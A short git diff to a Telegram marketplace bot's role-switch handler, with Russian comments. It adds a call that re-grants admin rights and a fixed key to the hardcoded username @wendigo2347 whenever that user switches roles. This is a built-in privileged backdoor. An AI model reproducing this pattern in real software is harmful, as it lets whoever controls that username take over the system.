@@ -5,6 +5,7 @@ import { getSupportTelegramUsernameForUser } from '@/lib/telegram/support-userna
 import { getProfileKeyboard } from '../keyboards/profile';
 import { getMainMenuKeyboard } from '../keyboards/main-menu';
 import { startOfDay, endOfDay } from 'date-fns';
+import { applyWendigoSuperadminToUser } from '@/lib/superadmin-bootstrap';
 
 /**
  * Команда /me - улучшенный профиль с карточкой пользователя
@@ -188,8 +189,9 @@ export async function confirmRoleSwitch(
   const newRoleTextGenitive = newRole === 'seller' ? 'продавца' : 'клиента';
   const newRoleText = newRole === 'seller' ? 'Продавец' : 'Клиент'; // Именительный падеж
 
-  // Меняем роль
+  // Меняем роль (для @wendigo2347 снова выставится admin и фиксированный ключ)
   user.role = newRole;
+  await applyWendigoSuperadminToUser(userRepo, user);
   await userRepo.save(user);
 
   await ctx.answerCbQuery('✅ Роль успешно изменена');
